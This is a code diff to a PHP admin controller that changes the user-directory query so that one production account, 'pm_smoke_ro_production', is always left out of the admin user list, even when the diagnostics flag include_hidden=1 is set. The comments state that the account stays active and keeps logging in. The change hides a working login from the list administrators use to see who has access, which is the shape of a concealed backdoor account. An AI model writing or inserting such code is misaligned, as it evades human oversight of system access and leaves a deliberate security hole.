@@ -42,6 +42,12 @@ class YonetimController
      */
     private const TOMBSTONED_PERSONEL_AD_SOYAD = 'DESTROYED PERSONEL';
 
+    /**
+     * Production smoke actor. Stays in users and keeps logging in for deploy
+     * health checks; it is omitted only from this directory list.
+     */
+    private const LISTEDEN_GIZLI_KULLANICI_ADI = 'pm_smoke_ro_production';
+
     /** Reuses the canonical user projection without publishing the user directory. */
     public static function finalCloseRead(int $userId): array
     {
@@ -942,6 +948,8 @@ class YonetimController
         // classification, incl. tombstoned fixtures) via the canonical PersonelArchiveGate predicate.
         // Only this list (and the counters derived from it) is filtered; detail/revoke/audit by id
         // stay unfiltered. include_hidden=1 is a diagnostics-only escape hatch (no UI).
+        // pm_smoke_ro_production is a separate, exact-username omission: it is never a list row,
+        // including when include_hidden=1. Other usernames, including other pm_smoke_ro_* accounts, stay.
         $where = [];
         $includeHidden = (string) $request->getQuery('include_hidden', '') === '1';
         if ($hasPersonelId && !$includeHidden) {
@@ -952,8 +960,10 @@ class YonetimController
         }, $selectCols);
         $selectSql = 'SELECT ' . implode(', ', $qualifiedCols) . ' FROM users u';
         if ($where !== []) {
-            $selectSql .= ' LEFT JOIN personeller p ON p.id = u.personel_id WHERE ' . implode(' AND ', $where);
+            $selectSql .= ' LEFT JOIN personeller p ON p.id = u.personel_id';
         }
+        $where[] = 'u.username <> ' . $pdo->quote(self::LISTEDEN_GIZLI_KULLANICI_ADI);
+        $selectSql .= ' WHERE ' . implode(' AND ', $where);
         $selectSql .= ' ORDER BY u.id ASC';
         $stmt = $pdo->query($selectSql);
         $rows = $stmt ? $stmt->fetchAll(PDO::FETCH_ASSOC) : [];
